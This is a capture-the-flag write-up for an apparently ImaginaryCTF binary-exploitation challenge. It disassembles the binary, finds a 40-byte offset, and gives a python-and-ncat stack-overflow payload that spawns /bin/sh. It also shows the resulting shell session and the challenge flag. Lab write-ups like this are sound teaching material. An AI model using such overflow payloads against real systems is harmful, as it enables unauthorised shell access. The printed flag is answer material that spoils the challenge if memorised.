# STACKOVERFLOW
```
Description
Welcome to Stack Overflow! Get answers to all your programming questions right here!

Attachments
https://imaginaryctf.org/r/E795-stackoverflow nc chal.imaginaryctf.org 42001
```

- File : [stackoverflow](../attachements/stackoverflow/stackoverflow)

Upon connection via ncat we obtain a greeting message and we have to input text :
```
Welcome to StackOverflow! Before you start ~~copypasting code~~ asking good questions, we would like you to answer a question. What's your favorite color?
a
Thanks! Now onto the posts!
ERROR: FEATURE NOT IMPLEMENTED YET
```

So we need to type the right sequence of char to obtain the flag.

By inspecting the binary we see a **cmp **instruction after the **scanf** instruction :
```
[...]
│           0x00000825      e866feffff     call sym.imp.__isoc99_scanf
│           0x0000082a      488d3d750100.  lea rdi, str.Thanks__Now_onto_the_posts_ ; 0x9a6 ; "Thanks! Now onto the posts!"
│           0x00000831      e82afeffff     call sym.imp.puts
│           0x00000836      48817df86674.  cmp qword [var_8h], 0x69637466
│       ┌─< 0x0000083e      751f           jne 0x85f
│       │   0x00000840      488d3d7b0100.  lea rdi, str.DEBUG_MODE_ACTIVATED. ; 0x9c2 ; "DEBUG MODE ACTIVATED."
│       │   0x00000847      e814feffff     call sym.imp.puts
│       │   0x0000084c      488d3d850100.  lea rdi, str._bin_sh        ; 0x9d8 ; "/bin/sh"
│       │   0x00000853      b800000000     mov eax, 0
│       │   0x00000858      e813feffff     call sym.imp.system
│      ┌──< 0x0000085d      eb0c           jmp 0x86b
│      ││   ; CODE XREF from main @ 0x83e
│      │└─> 0x0000085f      488d3d7a0100.  lea rdi, str.ERROR:_FEATURE_NOT_IMPLEMENTED_YET ; 0x9e0 ; "ERROR: FEATURE NOT IMPLEMENTED YET"
│      │    0x00000866      e8f5fdffff     call sym.imp.puts
│      │    ; CODE XREF from main @ 0x85d
│      └──> 0x0000086b      b800000000     mov eax, 0
│           0x00000870      c9             leave
└           0x00000871      c3             ret
```

we need to avoid the **jne** at **0x83e** in order to get to the **system('/bin/sh')** at **0x858**

With gdb we see that the comparison is done between whatever is written at rbp-0x8 and 0x69637466 (= "ictf" in ascii ) :
```
=> 0x555555400836 <main+124>:    cmp    QWORD PTR [rbp-0x8],0x69637466
```
at **rbp-0x8** is written **BBBB** we must rewrite it with a buffer overflow :
```
[-------------------------------------code-------------------------------------]
   0x555555400825 <main+107>:    call   0x555555400690 <__isoc99_scanf@plt>
   0x55555540082a <main+112>:    lea    rdi,[rip+0x175]        # 0x5555554009a6
   0x555555400831 <main+119>:    call   0x555555400660 <puts@plt>
=> 0x555555400836 <main+124>:    cmp    QWORD PTR [rbp-0x8],0x69637466
   0x55555540083e <main+132>:    jne    0x55555540085f <main+165>
   0x555555400840 <main+134>:    lea    rdi,[rip+0x17b]        # 0x5555554009c2
   0x555555400847 <main+141>:    call   0x555555400660 <puts@plt>
   0x55555540084c <main+146>:    lea    rdi,[rip+0x185]        # 0x5555554009d8
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe100 --> 0x42424242 ('AAAA')
0008| 0x7fffffffe108 --> 0x555555400880 (<__libc_csu_init>:    push   r15)
0016| 0x7fffffffe110 --> 0x0 
0024| 0x7fffffffe118 --> 0x5555554006b0 (<_start>:    xor    ebp,ebp)
0032| 0x7fffffffe120 --> 0x7fffffffe220 --> 0x1 
0040| 0x7fffffffe128 --> 0x42424242 ('BBBB')
0048| 0x7fffffffe130 --> 0x0 
0056| 0x7fffffffe138 --> 0x7ffff7dfab25 (<__libc_start_main+213>:    mov    edi,eax)
[------------------------------------------------------------------------------]
```

Here I typed **AAAA** ( @0x7fffffffe100 on the stack ) and we need to overflow **BBBB** ( @0x7fffffffe128 ) with **ictf**

`0x7fffffffe128 - 0x7fffffffe100 = 40 buffer chars`

`+ ftci` (backward because of little-endianness )

The solution is :
```
$ ( python -c "print('A'*40+'ftci')" ; cat ) | ncat chal.imaginaryctf.org 42001  
```

```                                                        
Welcome to StackOverflow! Before you start ~~copypasting code~~ asking good questions, we would like you to answer a question. What's your favorite color?
Thanks! Now onto the posts!
DEBUG MODE ACTIVATED.
ls
flag.txt
run
cat flag.txt
ictf{4nd_th4t_1s_why_y0u_ch3ck_1nput_l3ngth5_486b39aa}
```

flag : `ictf{4nd_th4t_1s_why_y0u_ch3ck_1nput_l3ngth5_486b39aa}`
